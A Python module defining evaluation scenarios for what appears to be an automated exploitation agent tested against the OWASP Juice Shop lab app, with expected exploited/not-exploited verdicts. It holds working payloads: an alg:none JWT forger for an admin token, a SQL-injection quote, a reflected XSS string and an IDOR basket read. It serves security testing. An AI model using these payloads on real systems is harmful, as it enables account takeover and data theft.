"""Named eval scenarios with EXPECTED verdicts (Phase 8 visual layer).

The original benchmark only probed the four in-scope *exploitable* classes, so every
end result was a true positive. To tell a fuller, more honest story to a reviewer we
add scenarios whose correct outcome is *not exploited*:

* ``true_negative`` — the agent accesses its OWN resource; a correct verifier must NOT
  flag IDOR (identical baseline/attack bodies). Proves the system does not cry wolf.
* ``fp_guard`` — a benign failed login that returns a 401 but NO DB-error signature; the
  error-based SQLi verifier must reject it. Proves "any error == SQLi" is not the rule.

Every scenario is runnable in ENGINE MODE (a canonical prepared payload, no LLM), so the
outcomes are deterministic and reproducible — ideal for a live demo click. Each carries
an ``expected_exploited`` flag so the dashboard can show expected-vs-actual badges.
"""
from __future__ import annotations

import base64
import json
import time
from dataclasses import dataclass, field
from typing import Optional

from schemas.models import Endpoint, Hypothesis, ParamSchema, Payload, VulnClass


def _forge_none_jwt(data: dict) -> str:
    b = lambda x: base64.urlsafe_b64encode(x).rstrip(b"=").decode()
    h = b(json.dumps({"typ": "JWT", "alg": "none"}).encode())
    p = b(json.dumps({"data": data, "iat": int(time.time()), "exp": int(time.time()) + 3600}).encode())
    return f"{h}.{p}."


@dataclass
class Scenario:
    name: str
    vuln_class: VulnClass
    expected_exploited: bool
    kind: str                     # tp | true_negative | fp_guard | false_negative
    description: str
    endpoint: Endpoint
    payload: Payload              # canonical engine-mode payload
    in_scope: bool = True
    auth_context: dict = field(default_factory=dict)   # for agent mode (unused in engine mode)

    def hypothesis(self, attempt_number: int = 1) -> Hypothesis:
        return Hypothesis(
            vuln_class=self.vuln_class, endpoint=self.endpoint,
            rationale=f"[scenario:{self.name}] {self.description}",
            payload=self.payload, success_criteria=self.description,
            attempt_number=attempt_number,
        )


def build_scenarios(base: str, auth: dict) -> list[Scenario]:
    """All scenarios, parameterised by target + bootstrapped auth (own basket id/token)."""
    own = int(auth["own_resource_id"])
    victim = 1 if own != 1 else 2
    token = auth["auth_token"]
    forged = _forge_none_jwt({"id": 1, "email": "admin@juice-sh.op"})

    def basket_ep(sample_id: int) -> Endpoint:
        return Endpoint(url=f"{base}/rest/basket/:id", method="GET", auth_required=True,
                        params=[ParamSchema(name="id", location="path", type="int",
                                            sample_value=str(sample_id))])

    return [
        # ---- in-scope true positives (should be exploited) ----
        Scenario(
            name="idor_other_basket", vuln_class="IDOR", expected_exploited=True, kind="tp",
            description="read another user's basket by swapping a sequential id",
            endpoint=basket_ep(own),
            payload=Payload(method="GET", url=f"{base}/rest/basket/{victim}", auth_token=token),
            auth_context={"auth_token": token, "own_resource_id": own,
                          "hint": "basket ids are small sequential integers; use one != own"},
        ),
        Scenario(
            name="sqli_error_login", vuln_class="SQLI_ERROR", expected_exploited=True, kind="tp",
            description="break login SQL with a lone quote to leak a DB error",
            endpoint=Endpoint(url=f"{base}/rest/user/login", method="POST"),
            payload=Payload(method="POST", url=f"{base}/rest/user/login",
                            body={"email": "'", "password": "x"}),
        ),
        Scenario(
            name="xss_reflected_search", vuln_class="XSS_REFLECTED", expected_exploited=True, kind="tp",
            description="reflected XSS via the SPA search query parameter",
            endpoint=Endpoint(url=f"{base}/#/search?q=", method="GET"),
            payload=Payload(method="GET",
                            url=f"{base}/#/search?q=<img src=x onerror=alert(1)>"),
        ),
        Scenario(
            name="broken_auth_forged_jwt", vuln_class="BROKEN_AUTH", expected_exploited=True, kind="tp",
            description="forged alg:none admin JWT accepted on a protected route",
            endpoint=Endpoint(url=f"{base}/rest/basket/1", method="GET", auth_required=True),
            payload=Payload(method="GET", url=f"{base}/rest/basket/1", auth_token=forged),
            auth_context={"auth_token": forged, "own_resource_id": 1,
                          "hint": "an unsigned (alg:none) admin JWT is provided; target /rest/basket/1"},
        ),

        # ---- correct NON-alarms (should NOT be exploited) ----
        Scenario(
            name="idor_own_basket_safe", vuln_class="IDOR", expected_exploited=False,
            kind="true_negative",
            description="accessing the user's OWN basket is legitimate; must not be flagged",
            endpoint=basket_ep(own),
            payload=Payload(method="GET", url=f"{base}/rest/basket/{own}", auth_token=token),
        ),
        Scenario(
            name="sqli_benign_login_guard", vuln_class="SQLI_ERROR", expected_exploited=False,
            kind="fp_guard",
            description="a benign failed login returns 401 but no DB error; must not be flagged as SQLi",
            endpoint=Endpoint(url=f"{base}/rest/user/login", method="POST"),
            payload=Payload(method="POST", url=f"{base}/rest/user/login",
                            body={"email": "nobody@example.com", "password": "wrong-password"}),
        ),
    ]
